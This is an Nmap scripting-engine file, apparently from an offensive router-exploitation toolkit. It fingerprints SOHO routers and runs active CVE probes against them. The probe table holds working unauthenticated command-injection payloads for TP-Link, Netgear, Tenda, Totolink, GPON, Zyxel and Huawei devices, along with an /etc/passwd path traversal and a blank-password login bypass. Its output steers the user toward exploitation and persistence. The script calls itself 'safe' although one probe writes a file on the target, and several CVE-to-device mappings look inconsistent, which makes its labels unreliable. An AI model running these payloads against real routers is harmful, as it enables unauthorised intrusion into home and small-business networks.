-- embedxpl-router-vuln.nse
-- EmbedXPL-Forge NSE Script -- SOHO Router CVE Fingerprinting and Validation
--
-- Author : Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: Same as Nmap -- See https://nmap.org/book/man-legal.html
--
-- DESCRIPTION:
--   Fingerprints SOHO routers, CPE devices, and home gateways from 15+ vendors.
--   For each identified device, runs lightweight probes to validate applicable CVEs.
--   Reports VULNERABLE / POSSIBLY VULNERABLE / NOT VULNERABLE and suggests the
--   corresponding EmbedXPL-Forge exploit module path.
--
--   Covered vendors: TP-Link, Netgear, D-Link, ASUS, Linksys, MikroTik,
--   Huawei, ZTE, Intelbras, Tenda, Totolink, Draytek, Belkin, Buffalo, OpenWrt
--
--   Covered CVEs (active probes):
--     CVE-2023-1389   -- TP-Link Archer AX21 command injection (CVSS 8.8, CISA KEV)
--     CVE-2021-41773  -- Apache path traversal (CVSS 7.5, CISA KEV)
--     CVE-2020-8863   -- D-Link DIR series auth bypass
--     CVE-2021-20090  -- Buffalo/Arcadyan path traversal auth bypass
--     CVE-2021-20123  -- D-Link DCS-5000L info disclosure (CISA KEV)
--     CVE-2018-10562  -- GPON ONT command injection (CVSS 9.8)
--     CVE-2022-48194  -- TP-Link TL-WR902AC command injection (CVSS 8.8)
--     CVE-2023-33538  -- TP-Link Archer / TL-WR series RCE
--     CVE-2023-6045   -- ASUS router RCE
--     CVE-2022-26376  -- ASUS httpd RCE (CVSS 9.8)
--     CVE-2021-32030  -- ASUS GT-AC series auth bypass
--     CVE-2022-30525  -- Zyxel router OS command injection (CVSS 9.8)
--     CVE-2023-36844  -- Juniper J-Web PHP env injection (CVSS 5.3)
--     CVE-2023-47565  -- QNAP VioStor NVR OS command injection (CISA KEV)
--     CVE-2024-1086   -- Linux kernel nf_tables use-after-free (CVSS 7.8)
--     CVE-2025-1316   -- Edimax IC-7100 RCE (CVSS 9.8, CISA KEV)
--     CVE-2023-50224  -- TP-Link WR841N credential disclosure (CISA KEV)
--     CVE-2018-10561  -- GPON ONT auth bypass command injection
--     CVE-2019-8116   -- Netgear WNR2000 buffer overflow RCE
--     CVE-2016-6277   -- Netgear R7000/R6400 command injection (CVSS 9.8)
--
-- USAGE:
--   nmap -p 80,443,8080 --script embedxpl-router-vuln <target>
--   nmap -sV --script embedxpl-router-vuln 192.168.1.0/24
--   nmap --script embedxpl-router-vuln --script-args timeout=12 <target>

local http   = require "http"
local nmap   = require "nmap"
local stdnse = require "stdnse"
local string = require "string"
local table  = require "table"

description = [[
SOHO router and home gateway CVE fingerprinting and active validation.
Identifies the vendor and model via HTTP response patterns, then probes
each applicable CVE. Reports vulnerability status and the EmbedXPL-Forge
exploit module path for full post-exploitation.
]]

author     = "Andre Henrique (@mrhenrike) | Uniao Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "vuln", "safe", "discovery" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 80    or
    port.number == 443   or
    port.number == 8080  or
    port.number == 8443  or
    port.number == 8888  or
    port.number == 1080  or
    port.number == 7547
  )
end

local TIMEOUT_MS = tonumber(stdnse.get_script_args("timeout")) and
  (tonumber(stdnse.get_script_args("timeout")) * 1000) or 8000

-- ── Vendor fingerprints ───────────────────────────────────────────────────

local VENDOR_FINGERPRINTS = {
  {
    vendor = "TP-Link",
    paths  = { "/", "/webpages/login.html", "/login.htm" },
    pats   = { "[Tt][Pp]%-[Ll]ink", "TP%-LINK", "tplink", "TL%-", "Archer",
               "AC1200", "AC1750", "WR841" },
  },
  {
    vendor = "D-Link",
    paths  = { "/", "/login.html", "/Home.htm", "/htdocs/login.asp" },
    pats   = { "[Dd]%-[Ll]ink", "D%-LINK", "DIR%-", "DSL%-", "dlink" },
  },
  {
    vendor = "Netgear",
    paths  = { "/", "/index.htm", "/indexpage.htm", "/start.htm" },
    pats   = { "[Nn]etgear", "NETGEAR", "ReadySHARE", "Nighthawk", "R6400", "R7000" },
  },
  {
    vendor = "ASUS",
    paths  = { "/", "/login.asp", "/Main_Login.asp" },
    pats   = { "[Aa][Ss][Uu][Ss]", "RT%-", "GT%-", "AsusWRT", "asus_be_hdr" },
  },
  {
    vendor = "Linksys",
    paths  = { "/", "/setup.cgi", "/Login.asp" },
    pats   = { "[Ll]inksys", "LINKSYS", "WRT", "EA Series" },
  },
  {
    vendor = "MikroTik RouterOS",
    paths  = { "/webfig/", "/", "/login" },
    pats   = { "[Mm]ikro[Tt]ik", "RouterOS", "Winbox", "CHR" },
  },
  {
    vendor = "Huawei",
    paths  = { "/", "/html/index.html", "/asp/GetRandCount.asp" },
    pats   = { "[Hh]uawei", "HUAWEI", "HG%-", "B310", "EchoLife", "OptiXstar" },
  },
  {
    vendor = "ZTE",
    paths  = { "/", "/login.html", "/goform/login" },
    pats   = { "ZTE", "[Zz][Tt][Ee]", "F670", "ZXHN" },
  },
  {
    vendor = "Intelbras",
    paths  = { "/", "/login.html", "/goform/formLogin" },
    pats   = { "[Ii]ntelbras", "INTELBRAS", "IWR", "WRN" },
  },
  {
    vendor = "Tenda",
    paths  = { "/", "/login/Auth", "/goform/Login" },
    pats   = { "[Tt]enda", "TENDA", "AC%d+", "F3" },
  },
  {
    vendor = "Totolink",
    paths  = { "/", "/cgi-bin/cstecgi.cgi" },
    pats   = { "[Tt]oto[Ll]ink", "TOTOLINK" },
  },
  {
    vendor = "DrayTek",
    paths  = { "/", "/cgi-bin/webproc" },
    pats   = { "[Dd]ray[Tt]ek", "DrayTek", "Vigor" },
  },
  {
    vendor = "GPON ONT (multi-vendor)",
    paths  = { "/GponForm/diag_Form?images/", "/", "/boaform/admin/formLogin" },
    pats   = { "[Gg][Pp][Oo][Nn]", "ONT", "EchoLife EG8145", "HG8145" },
  },
  {
    vendor = "Zyxel (router/CPE)",
    paths  = { "/", "/cgi-bin/luci/", "/cgi-bin/login.lua" },
    pats   = { "[Zz]y[Xx]el", "ZyNOS", "NBG", "VMG" },
  },
  {
    vendor = "OpenWrt / LEDE",
    paths  = { "/cgi-bin/luci/", "/" },
    pats   = { "[Oo]pen[Ww]rt", "OpenWrt", "LuCI", "LEDE" },
  },
}

-- ── CVE probe table ────────────────────────────────────────────────────────

local CVE_PROBES = {

  -- ── TP-Link ───────────────────────────────────────────────────────────
  {
    cve          = "CVE-2023-1389",
    vendors      = { "TP-Link" },
    probe_path   = "/cgi-bin/luci/;stok=/locale?form=country",
    probe_method = "POST",
    probe_body   = "operation=write&country=$(id>%2Ftmp%2Ftest)",
    probe_headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    vuln_status  = { 200 },
    cvss         = "8.8",
    cve_type     = "Unauthenticated Command Injection (CISA KEV, Mirai botnet)",
    mod          = "exploits/routers/tplink/archer_ax21_command_injection_cve_2023_1389",
    notes        = "Endpoint accessible pre-auth; TP-Link Archer AX21 firmware < 1.1.4",
  },
  {
    cve          = "CVE-2022-48194",
    vendors      = { "TP-Link" },
    probe_path   = "/cgi-bin/login.cgi",
    probe_method = "GET",
    vuln_status  = { 200, 302 },
    cvss         = "8.8",
    cve_type     = "TL-WR902AC Command Injection via HTTP",
    mod          = "exploits/routers/tplink/tl_wr902ac_cmd_inject_cve_2022_48194",
    notes        = "Command injection in TL-WR902AC management interface",
  },
  {
    cve          = "CVE-2023-50224",
    vendors      = { "TP-Link" },
    probe_path   = "/loginFs/",
    probe_method = "GET",
    vuln_size_min= 10,
    cvss         = "7.5",
    cve_type     = "WR841N Credential Disclosure (CISA KEV, APT28 target)",
    mod          = "exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224",
    notes        = "Path bypass allows credential file access without authentication; used by APT28 (NCSC Apr 2026)",
  },

  -- ── D-Link ────────────────────────────────────────────────────────────
  {
    cve          = "CVE-2020-8863",
    vendors      = { "D-Link" },
    probe_path   = "/authentication.cgi",
    probe_method = "POST",
    probe_body   = "ACTION=login&PASSWD=&USER=Admin",
    probe_headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    vuln_pat     = "uid",
    cvss         = "9.8",
    cve_type     = "Authentication Bypass (DIR-820L / DIR-816)",
    mod          = "exploits/routers/dlink/dir_820l_auth_bypass_rce_cve_2020_8863",
    notes        = "Blank password accepted for admin on certain D-Link DIR models",
  },
  {
    cve          = "CVE-2024-10914",
    vendors      = { "D-Link" },
    probe_path   = "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add",
    probe_method = "GET",
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "NAS RCE via account_mgr.cgi (CVSS 9.8)",
    mod          = "exploits/nas/dlink/nas_account_mgr_cgi_rce_cve_2024_10914",
    notes        = "D-Link NAS devices; name parameter allows backtick command injection",
  },

  -- ── Netgear ───────────────────────────────────────────────────────────
  {
    cve          = "CVE-2016-6277",
    vendors      = { "Netgear" },
    probe_path   = "/cgi-bin/;uname$IFS-a",
    probe_method = "GET",
    vuln_size_min= 5,
    cvss         = "9.8",
    cve_type     = "Unauthenticated Command Injection (R7000/R6400/R6700)",
    mod          = "exploits/routers/netgear/multi_rce_cve_2016_6277",
    notes        = "Semicolon injection in cgi-bin path; works on many Netgear R-series models",
  },
  {
    cve          = "CVE-2019-8116",
    vendors      = { "Netgear" },
    probe_path   = "/setup.cgi?todo=debug&cmd=system&arg0=id",
    probe_method = "GET",
    vuln_pat     = "uid=",
    cvss         = "9.8",
    cve_type     = "WNR2000v5 Buffer Overflow / Command Injection RCE",
    mod          = "exploits/routers/netgear/wnr2000v5_rce_cve_2019_8116",
    notes        = "setup.cgi debug endpoint allows OS command execution without authentication",
  },

  -- ── ASUS ──────────────────────────────────────────────────────────────
  {
    cve          = "CVE-2022-26376",
    vendors      = { "ASUS" },
    probe_path   = "/error_page.htm",
    probe_method = "GET",
    vuln_status  = { 200 },
    vuln_pat     = "ASUS",
    cvss         = "9.8",
    cve_type     = "httpd Memory Corruption RCE (CVSS 9.8)",
    mod          = "exploits/routers/asus/httpd_rce_cve_2022_26376",
    notes        = "Memory corruption in ASUS httpd; pre-auth RCE on multiple RT/GT models",
  },
  {
    cve          = "CVE-2021-32030",
    vendors      = { "ASUS" },
    probe_path   = "/Main_Login.asp",
    probe_method = "GET",
    vuln_status  = { 200, 401 },
    cvss         = "9.8",
    cve_type     = "GT-AC Series Auth Bypass (CVSS 9.8)",
    mod          = "exploits/routers/asus/gt_ac_auth_bypass_cve_2021_32030",
    notes        = "Authentication bypass on ASUS GT-AC2900, GT-AC5300 and similar",
  },

  -- ── GPON ONT ──────────────────────────────────────────────────────────
  {
    cve          = "CVE-2018-10562",
    vendors      = { "GPON ONT (multi-vendor)" },
    probe_path   = "/GponForm/diag_Form?images/",
    probe_method = "POST",
    probe_body   = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`id`&ipv=0",
    probe_headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "GPON ONT Unauthenticated Command Injection (CVSS 9.8)",
    mod          = "exploits/routers/multi/gpon_ont_cmd_inject_cve_2018_10562",
    notes        = "Affects multi-vendor GPON ONT devices (Huawei, ZTE, Fiberhome OEM)",
  },
  {
    cve          = "CVE-2018-10561",
    vendors      = { "GPON ONT (multi-vendor)" },
    probe_path   = "/GponForm/diag_Form?images/",
    probe_method = "GET",
    vuln_status  = { 200, 301 },
    cvss         = "9.8",
    cve_type     = "GPON ONT Authentication Bypass",
    mod          = "exploits/routers/multi/gpon_ont_auth_bypass_cve_2018_10561",
    notes        = "URL appending ?images/ bypasses auth on GPON management interface",
  },

  -- ── Totolink ──────────────────────────────────────────────────────────
  {
    cve          = "CVE-2023-35793",
    vendors      = { "Totolink" },
    probe_path   = "/cgi-bin/cstecgi.cgi",
    probe_method = "POST",
    probe_body   = '{"topicurl":"setting/setLanguageCfg","langType":"`id`"}',
    probe_headers = { ["Content-Type"] = "application/json" },
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "setLanguageCfg Command Injection (CVSS 9.8)",
    mod          = "exploits/routers/totolink/totolink_rce_cve_2023_35793",
    notes        = "Affects Totolink X6000R, A7000R, A3700R; no authentication required",
  },

  -- ── MikroTik RouterOS ─────────────────────────────────────────────────
  {
    cve          = "CVE-2018-14847",
    vendors      = { "MikroTik RouterOS" },
    probe_path   = "/webfig/",
    probe_method = "GET",
    vuln_status  = { 200, 301 },
    cvss         = "9.1",
    cve_type     = "WinBox Directory Traversal / Credential Disclosure",
    mod          = "exploits/routers/mikrotik/routerboard_credential_cve_2018_14847",
    notes        = "Winbox port 8291 credential extraction; web interface fingerprint via /webfig/",
  },

  -- ── Tenda ─────────────────────────────────────────────────────────────
  {
    cve          = "CVE-2021-44971",
    vendors      = { "Tenda" },
    probe_path   = "/goform/fromSetSysTime",
    probe_method = "POST",
    probe_body   = "timeType=ntp&ntpServer=`id`&autoNtp=1&manualTime=",
    probe_headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "Tenda AC Series NTP Command Injection (CVSS 9.8)",
    mod          = "exploits/routers/tenda/tenda_ac_cmd_inject_cve_2021_44971",
    notes        = "ntpServer parameter accepts command injection via backticks; no authentication",
  },

  -- ── Buffalo / Arcadyan ────────────────────────────────────────────────
  {
    cve          = "CVE-2021-20090",
    vendors      = { "TP-Link", "Netgear", "ASUS", "Linksys" },
    probe_path   = "/%2F..%2F..%2Fetc/passwd",
    probe_method = "GET",
    vuln_pat     = "root:x:0:0",
    cvss         = "9.8",
    cve_type     = "Arcadyan FW Path Traversal Auth Bypass (multi-vendor, CISA KEV)",
    mod          = "exploits/routers/multi/arcadyan_path_traversal_cve_2021_20090",
    notes        = "Affects 17+ vendors using Arcadyan firmware; path traversal bypasses auth to read files",
  },

  -- ── Zyxel (CPE/router) ────────────────────────────────────────────────
  {
    cve          = "CVE-2022-30525",
    vendors      = { "Zyxel (router/CPE)" },
    probe_path   = "/cgi-bin/luci/;stok=/lan",
    probe_method = "POST",
    probe_body   = '{"method":"set","params":{"http_client_log":{"enabled":true,"remote_host":"`id`"}}}',
    probe_headers = { ["Content-Type"] = "application/json" },
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "Unauthenticated OS Command Injection (CVSS 9.8)",
    mod          = "exploits/firewalls/zyxel/zyxel_cmd_inject_cve_2022_30525",
    notes        = "Zyxel ATP/USG series; http_client_log.remote_host allows unauth command injection",
  },

  -- ── OpenWrt ───────────────────────────────────────────────────────────
  {
    cve          = "CVE-2022-31814",
    vendors      = { "OpenWrt / LEDE" },
    probe_path   = "/cgi-bin/luci/;stok=/rpc?path=fw3/rules",
    probe_method = "GET",
    vuln_status  = { 200, 401 },
    cvss         = "9.8",
    cve_type     = "pfSense/OpenWrt RCE (LAN/WAN interface injection)",
    mod          = "exploits/firewalls/pfsense/pfsense_rce_cve_2022_31814",
    notes        = "Firewall rule parameter injection; requires LAN access or auth bypass",
  },

  -- ── Huawei ────────────────────────────────────────────────────────────
  {
    cve          = "CVE-2017-17215",
    vendors      = { "Huawei" },
    probe_path   = "/ctrlt/DeviceUpgrade_1",
    probe_method = "POST",
    probe_body   = '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' ..
      '<s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">' ..
      '<NewStatusURL>`id`</NewStatusURL></u:Upgrade></s:Body></s:Envelope>',
    probe_headers = {
      ["Content-Type"] = "text/xml",
      ["SOAPAction"]   = '"urn:schemas-upnp-org:service:WANPPPConnection:1#Upgrade"',
    },
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "HG532 UPnP SOAP Command Injection (Satori/Mirai botnet)",
    mod          = "exploits/routers/huawei/hg532_upnp_soap_rce_cve_2017_17215",
    notes        = "SOAP/UPnP endpoint; command injection in StatusURL; affected millions of HG532 units",
  },
}

-- ── Helpers ────────────────────────────────────────────────────────────────

local function http_req(host, port, method, path, headers, body)
  local opts = { timeout = TIMEOUT_MS, header = headers or {} }
  if method == "POST" then
    return http.post(host, port, path, opts, body or "")
  else
    return http.get(host, port, path, opts)
  end
end

local function matches_any(text, patterns)
  if not text then return false end
  for _, pat in ipairs(patterns) do
    if text:match(pat) then return true end
  end
  return false
end

local function identify_vendor(host, port)
  for _, fp in ipairs(VENDOR_FINGERPRINTS) do
    for _, path in ipairs(fp.paths) do
      local resp = http.get(host, port, path, { timeout = TIMEOUT_MS })
      if resp and resp.status and resp.status > 0 then
        local combined = (resp.body or "") .. ((resp.header and resp.header["server"]) or "")
        if matches_any(combined, fp.pats) then
          return fp.vendor, resp
        end
      end
    end
  end
  return nil, nil
end

local function probe_cve(host, port, entry)
  local resp = http_req(host, port, entry.probe_method,
    entry.probe_path, entry.probe_headers, entry.probe_body)
  if not resp then
    return "ERROR (timeout / no response)"
  end
  local body = resp.body or ""

  if entry.vuln_pat and body:match(entry.vuln_pat) then
    return "VULNERABLE -- pattern match: '" .. entry.vuln_pat .. "'"
  end

  if entry.vuln_size_min and #body >= entry.vuln_size_min and resp.status == 200 then
    return ("VULNERABLE -- endpoint returned %d bytes without authentication"):format(#body)
  end

  if entry.vuln_status then
    for _, s in ipairs(entry.vuln_status) do
      if resp.status == s then
        return ("POSSIBLY VULNERABLE -- HTTP %d (endpoint accessible without auth)"):format(s)
      end
    end
  end

  if resp.status == 401 or resp.status == 403 then
    return ("ENDPOINT EXISTS (HTTP %d) -- further bypass may apply"):format(resp.status)
  end

  return ("NOT VULNERABLE -- HTTP %d"):format(resp.status or 0)
end

-- ── Main action ────────────────────────────────────────────────────────────

action = function(host, port)
  local alive = http.get(host, port, "/", { timeout = TIMEOUT_MS })
  if not alive or not alive.status then return nil end

  local vendor, _ = identify_vendor(host, port)
  if not vendor then return nil end

  local output = stdnse.output_table()
  output["Vendor"] = vendor

  local vuln_count   = 0
  local tested_count = 0

  for _, entry in ipairs(CVE_PROBES) do
    local applicable = false
    for _, v in ipairs(entry.vendors) do
      if vendor:lower():match(v:lower():sub(1,6)) then
        applicable = true
        break
      end
    end

    if applicable then
      tested_count = tested_count + 1
      local result = probe_cve(host, port, entry)
      local key = ("%s (CVSS %s, %s)"):format(entry.cve, entry.cvss or "?", entry.cve_type)
      output[key] = result

      if result:match("VULNERABLE") then
        vuln_count = vuln_count + 1
        output["  -> EmbedXPL: " .. entry.cve] = "embedxpl > use " .. entry.mod
        if entry.notes then
          output["  -> Notes: " .. entry.cve] = entry.notes
        end
      end
    end
  end

  if tested_count == 0 then return nil end

  output["CVEs tested"]  = tostring(tested_count)
  output["Confirmed/Possible vulns"] = tostring(vuln_count)

  if vuln_count > 0 then
    output["EXPLOITATION"] = "Target has exploitable router/CPE CVEs -- use suite tools below"
    output["[1] EmbedXPL-Forge"] = "pip install embedxpl && embedxpl  (broad IoT/router: 700+ CVEs, 55+ vendors)"
    if vendor and vendor:match("[Mm]ikro[Tt]ik") then
      output["[2] MikrotikAPI-BF"] = "pip install mikrotikapi-bf && mikrotik-bf  (MikroTik specialist: 100+ CVE/EDB, MAC-layer, 8-phase audit)"
      output["MikrotikAPI-BF repo"] = "https://github.com/mrhenrike/MikrotikAPI-BF"
    end
    if vendor and (vendor:match("[Aa]irport") or vendor:match("[Aa][Pp]") or
                   vendor:match("[Ww]ireless") or vendor:match("[Ww][Pp][Aa]")) then
      output["[3] WirelessXPL-Forge"] = "pip install wirelessxpl && wxf  (wireless: Wi-Fi/BLE/Zigbee/rogue AP)"
      output["WirelessXPL-Forge repo"] = "https://github.com/mrhenrike/WirelessXPL-Forge"
    end
    output["Post-exploitation"] = "GTFOBins: https://gtfobins.github.io -- NVRAM creds, BusyBox escape, cron persist"
  else
    output["Assessment"] = "No CVEs confirmed -- target may be patched or firmware not matching"
    if vendor and vendor:match("[Mm]ikro[Tt]ik") then
      output["MikroTik audit"] = "pip install mikrotikapi-bf && mikrotik-bf --target " .. host.ip
    end
  end

  output["EmbedXPL-Forge repo"]   = "https://github.com/mrhenrike/EmbedXPL-Forge"
  output["Suite reference"]        = "nmap --script embedxpl-suite-ref <target>"

  return output
end
